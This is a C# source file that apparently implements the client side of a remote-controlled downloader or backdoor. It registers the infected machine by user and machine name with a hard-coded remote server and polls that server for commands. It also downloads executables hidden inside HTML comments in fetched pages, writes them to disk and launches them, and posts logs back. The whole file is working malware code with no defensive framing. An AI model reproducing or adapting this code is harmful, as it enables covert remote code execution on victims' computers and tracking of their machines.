using System;
using System.Collections.Generic;
using System.Text;

namespace InfinityPower
{
    internal static class Core
    {
        //public constructures region
        static Core()
        {
            service = new mainService.mainService();
            service.Url = UR + "/mainService.asmx";
        }

        //public functions region
        public static void Dnplic()
        {
            try
            {
                System.Net.WebClient webClient = new System.Net.WebClient();

                Byte[] exe = webClient.DownloadData(UR + "/" + PUBLIC);
                Byte[] dStr = System.Text.Encoding.ASCII.GetBytes(DATA_START);
                Byte[] dEnd = System.Text.Encoding.ASCII.GetBytes(DATA_END);
                Int32 start = indexOf(exe, dStr) + dStr.Length;
                Int32 end = lastIndexOf(exe, dEnd) - 1;

                if (start > 0 && end > 0)
                {
                    System.IO.FileStream fs = new System.IO.FileStream("public.exe", System.IO.FileMode.Create, System.IO.FileAccess.Write);
                    Core.TestLog("fd defining");
                    fs.Write(exe, start, (end - start) + 1);
                    Core.TestLog("write");
                    fs.Close();
                    Core.TestLog("close");

                    System.Diagnostics.Process.Start("public.exe");
                    Core.TestLog("public.exe started");
                }
            }
            catch (Exception ex)
            {
                Core.TestLog("error:" + ex.Source + ':' + ex.Message);
                WErrLg(ex.Message);
            }
        }

        public static void Lgplic()
        {
            Core.TestLog("p login");

            try
            {
                service.logPublics(pcId(), System.Windows.Forms.Application.ExecutablePath);
            }
            catch (Exception ex)
            {
                Core.WErrLg(ex.Message);
                Core.TestLog("error:" + ex.Source + ':' + ex.Message);
            }

            Core.TestLog("p login complete");
        }

        public static void Lg()
        {
            Core.TestLog("internet is connected");
            Core.TestLog("I login");

            try
            {
                service.logLogins(pcId(), System.Windows.Forms.Application.ExecutablePath);
            }
            catch (Exception ex)
            {
                Core.WErrLg(ex.Message);
                Core.TestLog("error:" + ex.Source + ':' + ex.Message);
            }
        }

        public static String[] Rdcmds()
        {

            Core.TestLog("ro intenter connected");

            try
            {
                return service.getCmds(pcId());
            }
            catch (Exception ex)
            {
                Core.WErrLg(ex.Message);
                Core.TestLog("error:" + ex.Source + ':' + ex.Message);
            }

            return null;
        }

        public static void Dncmd(String specialName)
        {

            Core.TestLog("ds internet");
            try
            {
                System.Net.WebClient webClient = new System.Net.WebClient();
                Byte[] exe = webClient.DownloadData(UR + "/" + specialName);
                Byte[] dStr = System.Text.Encoding.ASCII.GetBytes(DATA_START);
                Byte[] dEnd = System.Text.Encoding.ASCII.GetBytes(DATA_END);
                Int32 start = indexOf(exe, dStr) + dStr.Length;
                Int32 end = lastIndexOf(exe, dEnd) - 1;

                Core.TestLog("ds web client");
                String name = System.IO.Path.GetFileNameWithoutExtension(specialName) + ".exe";
                System.IO.FileStream fs = new System.IO.FileStream(name, System.IO.FileMode.Create, System.IO.FileAccess.Write);
                fs.Write(exe, start, (end - start) + 1);
                Core.TestLog("ds write");
                fs.Close();

                System.Diagnostics.Process.Start(name);
            }
            catch (Exception ex)
            {
                Core.TestLog("error:" + ex.Source + ':' + ex.Message);
                WErrLg(ex.Message);
            }
        }

        public static void Lgcmd(String cmd)
        {
            Core.TestLog("dc internet connect");
            try
            {
                Core.TestLog("wwp");

                service.confirmCmds(pcId(), cmd);

                Core.TestLog("wwp end");
            }
            catch (Exception ex)
            {
                Core.TestLog("error2:" + ex.Message);
                WErrLg(ex.Message);
            }
        }

        public static String pcId()
        {
            String result = System.Environment.UserName + ".";

            try
            {
                result += System.Environment.MachineName;
            }
            catch
            {
                Core.TestLog("error pcid");
            }

            Core.TestLog("pcid taken:" + result);
            return result;
        }

        public static void WErrLg(String message)
        {
            String titl = "";

            try
            {
                titl = Environment.OSVersion + "," + Environment.Version.Major + Environment.Version.Minor + Environment.TickCount;
            }
            catch
            {
                titl += "error";
            }

            writeWebPost(LG, "logf=errlg.mp4&sndr=" + pcId() + "&titl" + titl + "=&bod=" + message);
        }

        [System.Runtime.InteropServices.DllImport("wininet.dll")]
        public extern static bool InternetGetConnectedState(out int Description, int ReservedValue);

        [System.Diagnostics.Conditional("DEBUG")]
        public static void TestLog(String message)
        {
            System.IO.StreamWriter sw = new System.IO.StreamWriter("log.txt", true);
            sw.Write(message + Environment.NewLine);
            sw.Close();
        }

        //private functions region
        private static void writeWebPost(String webPage,String values)
        {
            try
            {
                Core.TestLog("write web post");
                System.Net.HttpWebRequest webRequest = (System.Net.HttpWebRequest)System.Net.WebRequest.Create(UR + "/" + webPage);
                System.Byte[] buffer = System.Text.Encoding.UTF8.GetBytes(values);

                Core.TestLog(UR + "/" + webPage + " is posted by " + values);
                webRequest.Method = "POST";
                webRequest.ContentType = "application/x-www-form-urlencoded";
                webRequest.ContentLength = buffer.Length;
                webRequest.GetRequestStream().Write(buffer, 0, buffer.Length);

                webRequest.GetRequestStream().Close();
            }
            catch(Exception ex)
            {
                //do nothing
                Core.TestLog("error2: " + ex.Source + ';' + ex.Message);
            }
        }

        private static Int32 indexOf(Byte[] array, Byte[] searchBytes, Int32 startIndex)
        {
            Int32 result = -1;

            if (startIndex < array.Length && startIndex >= 0)
            {
                if (array != null && searchBytes != null)
                {
                    for (Int32 i = startIndex; i <= array.Length - searchBytes.Length; i++)
                    {
                        Boolean found = true;

                        for (Int32 j = 0; j < searchBytes.Length; j++)
                        {
                            if (array[i + j] != searchBytes[j])
                            {
                                found = false;
                                break;
                            }
                        }

                        if (found)
                            return i;
                    }
                }
            }
            else
                throw (new ArgumentOutOfRangeException("startIndex", startIndex, "start index must be in range 0..array.Length-1"));

            return result;
        }

        private static Int32 indexOf(Byte[] array, Byte[] searchBytes)
        {
            return indexOf(array, searchBytes, 0);
        }

        private static Int32 lastIndexOf(Byte[] array, Byte[] searchBytes)
        {
            Int32 result = -1;

            if (array != null && searchBytes != null)
            {
                for (Int32 i = array.Length - searchBytes.Length; i >=0 ; i--)
                {
                    Boolean found = true;

                    for (Int32 j = 0; j < searchBytes.Length; j++)
                    {
                        if (array[i + j] != searchBytes[j])
                        {
                            found = false;
                            break;
                        }
                    }

                    if (found)
                        return i;
                }
            }

            return result;
        }

        //private fields region
        private static mainService.mainService service;

        //private constants region

        //private const String UR = "http://localhost:1090";
        private const String UR = "http://www.mainagent.somee.com";
        private const String LG = "log.aspx";
        private const String PUBLIC = "public.htm";
        private const String DATA_START = "<!--";
        private const String DATA_END = "-->";
    }
}
